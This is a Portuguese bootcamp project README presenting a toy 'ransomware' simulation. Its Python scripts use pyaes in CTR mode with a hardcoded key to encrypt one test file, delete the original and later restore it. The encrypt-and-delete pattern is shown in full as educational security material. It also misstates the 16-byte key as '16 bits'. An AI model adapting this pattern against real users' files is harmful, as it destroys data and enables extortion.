# Projeto: Criando um Ransonware com Python

## Descrição do Projeto
Este projeto tem como objetivo demonstrar o funcionamento básico de criptografia e descriptografia de arquivos utilizando a biblioteca `pyaes` em Python. 
Simula o funcionamento básico de um Ransonware como por exemplo o Wannacry.
O desafio consiste em criar uma pasta contendo um arquivo de texto simples, que é criptografado pelo código do script chamado Encrypt.py, e posteriormente descriptografado com o código do Decrypt.py para restaurar seu conteúdo original. Este projeto simula, de forma educativa, como funcionam operações similares realizadas por malwares ou por sistemas de proteção de dados.

**Nota importante:** Este projeto é destinado apenas para fins educativos. Nunca utilize este código para propósitos maliciosos ou ilegais.

---

## Ferramentas Utilizadas
1. **Python 3.** Linguagem de programação utilizada para desenvolver os códigos.
2. **pyaes.** Biblioteca Python para operações de criptografia AES (Advanced Encryption Standard).
3. **Sistema Operacional Linux (Kali Linux).** Ambiente usado para executar os scripts e simular as operações de criptografia.
4. ** GitHub.** Ferramenta utilizada para controle de versão e armazenamento do projeto.

---

## Passo a Passo

### **1. Configurar o Ambiente**
1. Certifique-se de que o Python 3 está instalado no seu sistema.
2. Instale a biblioteca `pyaes` utilizando um ambiente virtual ou o gerenciador `pip`:
   ```bash
   pip install pyaes
   ```

### **2. Criar a Estrutura do Projeto**
1. Crie uma pasta para o projeto com o nome que preferir (Neste exemplo foi criado como Desafio Ransonware).
2. Dentro da pasta, crie um arquivo de texto chamado `teste.txt` com o conteúdo de sua escolha (exemplo: "Este é um arquivo para teste de criptografia").

### **3. Criar o Script de Criptografia**
1. Foi criado um arquivo Python chamado `encrypt.py`com o editor nano do Kali Linux.
2. Foi inserido o seguinte código no arquivo:
   ```python
   import os
   import pyaes

   def encrypt_file(file_name, key):
       try:
           # Verifica se o arquivo existe
           if not os.path.exists(file_name):
               print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
               return

           # Lê os dados do arquivo
           with open(file_name, "rb") as file:
               file_data = file.read()

           # Remove o arquivo original
           os.remove(file_name)

           # Criptografa os dados
           aes = pyaes.AESModeOfOperationCTR(key)
           crypto_data = aes.encrypt(file_data)

           # Salva os dados criptografados
           new_file_name = file_name + ".ransomwaretroll"
           with open(new_file_name, "wb") as new_file:
               new_file.write(crypto_data)

           print(f"Arquivo '{file_name}' criptografado com sucesso como '{new_file_name}'.")

       except Exception as e:
           print(f"Erro ao criptografar o arquivo: {e}")

   # Chave de criptografia
   key = b"testeransomwares"

   # Nome do arquivo a ser criptografado
   file_name = "teste.txt"

   # Executa a função
   encrypt_file(file_name, key)
   ```

### **4. Criar o Script de Descriptografia**
1. Foi criado  um arquivo Python, também com o editor nano, chamado `decrypt.py`.
2. O seguinte código foi inserido no arquivo:
   ```python
   import os
   import pyaes

   def decrypt_file(file_name, key):
       try:
           # Verifica se o arquivo existe
           if not os.path.exists(file_name):
               print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
               return

           # Lê os dados do arquivo criptografado
           with open(file_name, "rb") as file:
               file_data = file.read()

           # Descriptografa os dados
           aes = pyaes.AESModeOfOperationCTR(key)
           decrypt_data = aes.decrypt(file_data)

           # Remove o arquivo criptografado
           os.remove(file_name)

           # Cria o arquivo descriptografado
           new_file_name = file_name.replace(".ransomwaretroll", "")
           with open(new_file_name, "wb") as new_file:
               new_file.write(decrypt_data)

           print(f"Arquivo '{file_name}' descriptografado com sucesso como '{new_file_name}'.")

       except Exception as e:
           print(f"Erro ao descriptografar o arquivo: {e}")

   # Chave de descriptografia
   key = b"testeransomwares"

   # Nome do arquivo criptografado
   file_name = "teste.txt.ransomwaretroll"

   # Executa a função
   decrypt_file(file_name, key)
   ```

---

## Descrição Detalhada do Código
Cada linha do código foi projetada para realizar uma tarefa específica:
1. **Importação de bibliotecas**: `os` para manipulação de arquivos e `pyaes` para criptografia AES.
2. **Função de criptografia**:
   - Verifica a existência do arquivo.
   - Lê os dados do arquivo em modo binário.
   - Remove o arquivo original para simular um comportamento de ransomware.
   - Criptografa os dados com uma chave AES de 16 bits.
   - Salva os dados criptografados em um novo arquivo.
3. **Função de descriptografia**:
   - Realiza a operação inversa: descriptografa os dados e recria o arquivo original.

---

## Resultados Esperados
- **Antes da criptografia**: O arquivo `teste.txt` está visível e legível.
- **Após a criptografia**: O arquivo `teste.txt` é removido e substituído por `teste.txt.ransomwaretroll`.
- **Após a descriptografia**: O arquivo original `teste.txt` é restaurado.


![image](https://github.com/user-attachments/assets/8ecf4feb-9ad3-4622-b0af-b76d71b02017)

![image](https://github.com/user-attachments/assets/81241989-2123-4334-8de4-a764387c25e1)

![image](https://github.com/user-attachments/assets/2c150c24-9090-4780-b061-13ff79cf11c3)

![image](https://github.com/user-attachments/assets/a224a4a9-694c-48c4-ad34-da019b64a4e6)

![image](https://github.com/user-attachments/assets/2ceb261a-8a72-486b-96f4-10f79862fd63)

![image](https://github.com/user-attachments/assets/f29460ef-8b59-4ac9-ab56-c4f1d984eb07)

![image](https://github.com/user-attachments/assets/f8f95151-15c6-49b5-b4bd-b825fc84c1e2)

![image](https://github.com/user-attachments/assets/4fa4ee00-5125-490a-90eb-6829f68fe162)









---

## Considerações Finais
Este projeto é um exemplo introdutório e educativo sobre criptografia e manipulação de arquivos com Python. 
Este desafio faz parte do Bootcamp Cyber Security #2 do Santander, Sob Orientação dos experts da DIO.
O projeto destaca princípios fundamentais de segurança da informação, como proteção de dados e uso de chaves criptográficas. Use este conhecimento para construir soluções éticas e seguras!
